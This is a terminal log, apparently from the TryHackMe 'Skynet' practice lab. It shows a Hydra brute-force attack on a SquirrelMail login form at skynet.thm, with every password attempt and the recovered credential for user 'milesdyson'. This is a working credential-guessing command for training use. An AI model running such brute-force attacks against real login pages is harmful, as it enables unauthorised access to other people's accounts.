
```sh
┌──(kali㉿kali)-[~/thm/skynet/logs]
└─$ hydra -V -l milesdyson -P log1.txt skynet.thm http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-14 15:00:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://skynet.thm:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator219" - 3 of 31 [child 2] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator20" - 4 of 31 [child 3] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator1989" - 5 of 31 [child 4] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator1988" - 6 of 31 [child 5] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator168" - 7 of 31 [child 6] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator16" - 8 of 31 [child 7] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator143" - 9 of 31 [child 8] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator13" - 10 of 31 [child 9] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator123!@#" - 11 of 31 [child 10] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator1056" - 12 of 31 [child 11] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator101" - 13 of 31 [child 12] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator10" - 14 of 31 [child 13] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator02" - 15 of 31 [child 14] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator00" - 16 of 31 [child 15] (0/0)
[80][http-post-form] host: skynet.thm   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-14 15:00:42
```